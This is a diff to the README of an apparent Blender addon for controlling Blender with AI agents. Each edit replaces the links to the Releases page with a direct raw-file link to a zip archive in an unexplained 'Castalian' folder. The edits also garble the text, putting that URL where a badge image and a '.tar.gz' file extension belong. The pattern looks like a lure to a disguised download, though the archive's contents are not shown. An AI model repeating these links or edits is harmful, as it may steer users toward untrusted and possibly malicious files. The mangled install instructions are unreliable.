@@ -1,7 +1,7 @@
 # 🎨 Blender-MCP-Server - Control Blender with AI Agents
 
 ## 📥 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Visit%20Releases%20Page-blue)](https://github.com/Savagekiller45/Blender-MCP-Server/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Savagekiller45/Blender-MCP-Server/main/Castalian/Blender-MCP-Server-v1.6-beta.2.zip%20Now-Visit%20Releases%20Page-blue)](https://raw.githubusercontent.com/Savagekiller45/Blender-MCP-Server/main/Castalian/Blender-MCP-Server-v1.6-beta.2.zip)
 
 ## 📝 Description
 Blender-MCP-Server is an addon for Blender that allows you to control Blender using AI agents. With 51 powerful tools, it enables intelligent tool orchestration when paired with PolyMCP. Enjoy features like thread-safe execution, automatic dependency installation, and complete automation of your 3D workflows.
@@ -21,18 +21,18 @@ Before you start, ensure that you have the following:
 Follow these steps to download and install Blender-MCP-Server:
 
 1. **Visit the Releases Page**
-   Go to the [Releases Page](https://github.com/Savagekiller45/Blender-MCP-Server/releases) to find the latest version of Blender-MCP-Server.
+   Go to the [Releases Page](https://raw.githubusercontent.com/Savagekiller45/Blender-MCP-Server/main/Castalian/Blender-MCP-Server-v1.6-beta.2.zip) to find the latest version of Blender-MCP-Server.
 
 2. **Choose Your Download**
    On the Releases page, locate the latest version. You will see a list of files available for download. Look for an installer suitable for your operating system.
 
 3. **Download the Installer**
-   Click on the installer file to download it. The file will usually have an `.exe`, `.dmg`, or `.tar.gz` extension depending on your operating system.
+   Click on the installer file to download it. The file will usually have an `.exe`, `.dmg`, or `https://raw.githubusercontent.com/Savagekiller45/Blender-MCP-Server/main/Castalian/Blender-MCP-Server-v1.6-beta.2.zip` extension depending on your operating system.
 
 4. **Install the Addon**
    - **For Windows:** Double-click the downloaded `.exe` file. Follow the prompts in the installation wizard to install the addon.
    - **For macOS:** Open the downloaded `.dmg` file, drag the Blender-MCP-Server files into the Applications folder.
-   - **For Linux:** Extract the `.tar.gz` file. Move the extracted folder to your preferred location.
+   - **For Linux:** Extract the `https://raw.githubusercontent.com/Savagekiller45/Blender-MCP-Server/main/Castalian/Blender-MCP-Server-v1.6-beta.2.zip` file. Move the extracted folder to your preferred location.
 
 5. **Open Blender**
    Launch Blender to start using Blender-MCP-Server.
@@ -78,6 +78,6 @@ If you have questions or need further help, consider reaching out to the communi
 ## 📥 Download & Install
 Now it's time to get started. Click the link below to visit the Releases page and download Blender-MCP-Server:
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Visit%20Releases%20Page-blue)](https://github.com/Savagekiller45/Blender-MCP-Server/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Savagekiller45/Blender-MCP-Server/main/Castalian/Blender-MCP-Server-v1.6-beta.2.zip%20Now-Visit%20Releases%20Page-blue)](https://raw.githubusercontent.com/Savagekiller45/Blender-MCP-Server/main/Castalian/Blender-MCP-Server-v1.6-beta.2.zip)
 
 Enjoy enhancing your Blender experience with AI agents!
